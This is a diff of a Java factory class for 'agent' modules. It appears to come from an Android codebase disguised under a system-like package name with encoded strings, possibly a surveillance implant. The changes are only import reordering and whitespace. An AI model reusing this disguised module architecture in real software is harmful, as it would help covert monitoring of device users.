@@ -9,13 +9,13 @@
 
 package com.android.syssetup.module;
 
-import java.util.Enumeration;
-import java.util.Hashtable;
-
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.interfaces.AbstractFactory;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
+
+import java.util.Enumeration;
+import java.util.Hashtable;
 
 public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$
@@ -51,7 +51,7 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	}
 
 	public String getType(Class cl) {
-		if(typemap.containsKey(cl)){
+		if (typemap.containsKey(cl)) {
 			return typemap.get(cl);
 		}
 		return "unknown type";
@@ -60,13 +60,12 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	/**
 	 * mapAgent() Add agent id defined by "key" into the running map. If the
 	 * agent is already present, the old object is returned.
-	 * 
-	 * @param type
-	 *            : Agent ID
+	 *
+	 * @param type : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
 	public BaseModule create(String type, String subtype) {
-		if(Cfg.DEBUG) {
+		if (Cfg.DEBUG) {
 			Check.requires(type != null, "Null type");
 		}
 
